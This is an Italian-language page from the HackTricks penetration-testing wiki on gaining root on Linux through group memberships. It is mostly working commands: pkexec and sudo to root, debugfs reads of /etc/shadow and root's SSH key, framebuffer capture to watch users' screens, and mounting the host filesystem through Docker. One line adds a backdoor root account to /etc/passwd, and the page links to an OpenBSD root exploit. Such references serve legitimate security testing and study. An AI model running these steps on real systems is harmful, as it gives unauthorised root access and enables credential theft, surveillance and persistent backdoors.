# Gruppi Interessanti - Escalation dei Privilegi Linux

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Gruppi Sudo/Admin

### **PE - Metodo 1**

**A volte**, **per impostazione predefinita (o perché alcuni software ne hanno bisogno)** all'interno del file **/etc/sudoers** puoi trovare alcune di queste righe:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Ciò significa che **qualsiasi utente che appartiene al gruppo sudo o admin può eseguire qualsiasi cosa come sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
### PE - Metodo 2

Trova tutti i binari suid e controlla se c'è il binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se trovi che il binario **pkexec è un binario SUID** e appartieni al gruppo **sudo** o **admin**, probabilmente puoi eseguire binari come sudo utilizzando `pkexec`.\
Questo perché di solito questi sono i gruppi all'interno della **polkit policy**. Questa policy identifica fondamentalmente quali gruppi possono utilizzare `pkexec`. Verificalo con il seguente comando:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Qui troverai quali gruppi sono autorizzati ad eseguire **pkexec** e **di default** in alcune distribuzioni Linux compaiono i gruppi **sudo** e **admin**.

Per **diventare root puoi eseguire**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Se si tenta di eseguire **pkexec** e si riceve questo **errore**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Non è perché non hai le autorizzazioni, ma perché non sei connesso senza una GUI**. E c'è una soluzione alternativa per questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Hai bisogno di **2 sessioni ssh diverse**:

{% code title="sessione1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Gruppo Wheel

**A volte**, **per impostazione predefinita** nel file **/etc/sudoers** è possibile trovare questa riga:
```
%wheel	ALL=(ALL:ALL) ALL
```
Ciò significa che **qualsiasi utente che appartiene al gruppo wheel può eseguire qualsiasi cosa come sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
## Gruppo Shadow

Gli utenti del **gruppo shadow** possono **leggere** il file **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## Gruppo del disco

Questo privilegio è quasi **equivalente all'accesso di root** poiché consente di accedere a tutti i dati all'interno della macchina.

File: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Nota che utilizzando debugfs puoi anche **scrivere file**. Ad esempio, per copiare `/tmp/asd1.txt` in `/tmp/asd2.txt`, puoi fare:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Tuttavia, se provi a **scrivere file di proprietà di root** (come `/etc/shadow` o `/etc/passwd`) otterrai un errore "**Permission denied**".

## Gruppo Video

Utilizzando il comando `w` puoi trovare **chi è connesso al sistema** e mostrerà un output simile al seguente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Il **tty1** significa che l'utente **yossi è connesso fisicamente** a un terminale sulla macchina.

Il gruppo **video** ha accesso alla visualizzazione dell'output dello schermo. Fondamentalmente, è possibile osservare gli schermi. Per farlo, è necessario **acquisire l'immagine corrente sullo schermo** in formato raw e ottenere la risoluzione che lo schermo sta utilizzando. I dati dello schermo possono essere salvati in `/dev/fb0` e è possibile trovare la risoluzione di questo schermo su `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Per **aprire** l'**immagine grezza** puoi utilizzare **GIMP**, selezionare il file \*\*`screen.raw` \*\* e selezionare come tipo di file **Dati immagine grezzi**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Successivamente, modifica la Larghezza e l'Altezza con quelle utilizzate sullo schermo e verifica i diversi Tipi di Immagine (e seleziona quello che mostra meglio lo schermo):

![](<../../../.gitbook/assets/image (288).png>)

## Gruppo Root

Sembra che di default **i membri del gruppo root** possano avere accesso per **modificare** alcuni file di configurazione dei **servizi** o alcuni file di **librerie** o **altre cose interessanti** che potrebbero essere utilizzate per l'elevazione dei privilegi...

**Verifica quali file possono essere modificati dai membri del gruppo root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Gruppo Docker

È possibile **montare il filesystem root della macchina host su un volume dell'istanza**, in modo che quando l'istanza viene avviata, carichi immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Infine, se non ti piace nessuna delle suggerimenti precedenti o se non funzionano per qualche motivo (firewall dell'API di Docker?), puoi sempre provare a **eseguire un container privilegiato ed evadere da esso** come spiegato qui:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

Se hai i permessi di scrittura sul socket di Docker, leggi [**questo post su come ottenere privilegi abusando del socket di Docker**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## Gruppo lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Gruppo Adm

Di solito i **membri** del gruppo **`adm`** hanno i permessi per **leggere i file di log** situati in _/var/log/_.\
Pertanto, se hai compromesso un utente appartenente a questo gruppo, dovresti sicuramente **controllare i log**.

## Gruppo Auth

In OpenBSD, di solito il gruppo **auth** può scrivere nelle cartelle _**/etc/skey**_ e _**/var/db/yubikey**_ se vengono utilizzate.\
Questi permessi possono essere sfruttati con l'exploit seguente per **ottenere privilegi di root**: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, consulta i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
